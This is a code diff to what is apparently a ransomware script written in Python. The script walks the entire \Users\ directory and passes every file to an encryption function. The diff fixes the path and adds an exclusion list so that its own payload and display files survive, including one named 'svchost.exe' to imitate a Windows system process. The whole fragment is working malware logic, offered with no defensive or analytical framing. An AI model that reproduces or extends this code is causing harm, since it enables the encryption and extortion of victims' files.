@@ -29,16 +29,17 @@ def file_ecrypt(key, name):
             pass
 # LIST ALL FILES EXTENSIONS AND INVOKE ENCRYPTION FUNCTION
 def filelist():
-    rep = ['\\users\\']
+    rep = ['\\Users\\']
     for user in rep:
         for root, dirs, files in os.walk(user):
             for file in files:
-                for ext in file.split("."):
-                    try:
-                        if file.endswith(ext):
-                            full_path = os.path.join(root, file)
-                            file_ecrypt(key, full_path)
-                    except PermissionError:
-                        pass
-                    except:
-                        pass
+                if(file != "GuiCounter.exe" and file != "svchost.exe" and file != "image.jpg"):
+                    for ext in file.split("."):
+                        try:
+                            if file.endswith(ext):
+                                ally = os.path.join(root, file)
+                                file_ecrypt(key, ally)
+                        except PermissionError:
+                            pass
+                        except:
+                            pass
